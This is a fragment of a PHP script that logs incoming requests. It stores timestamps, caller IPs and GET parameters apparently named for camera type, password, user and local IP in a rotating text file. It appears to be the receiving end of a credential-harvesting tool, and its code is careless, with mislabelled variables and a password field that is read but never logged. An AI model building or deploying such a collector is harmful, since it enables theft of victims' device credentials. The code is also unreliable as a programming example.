<?php
  $view_pass = "";     //PASSWORD USED TO ACCESS THE LOG
  $length = 2000; 
  $ctrl_file = "IPs.txt"; 

  $action = $_GET['action'];

  if ($action == "log"){     
    $datatime = date("H:i:s m/d/y");
    $daip = $_SERVER['REMOTE_ADDR'];
 
    $n_file_arry = array();

    $type = $_GET['cam'];  
    $host = $_GET['pws']; 
    $port = $_GET['user'];
    $user = $_GET['locip'];
    $n_file_arry[0] = "$datatime|$daip|$port|$user|$type|\r\n";
  
    $file_arry = file($ctrl_file);
    $counter = 0;

    while (list($key,$val) = each($file_arry)) {
      if ($val != ""){
        if ($key == $length-1) break;
        $n_file_arry[$key+1] = $val;
      }
    }

    $fp = fopen("$ctrl_file", "w");
    fputs($fp, join("",$n_file_arry));
    fclose($fp);
    exit;
 }
 
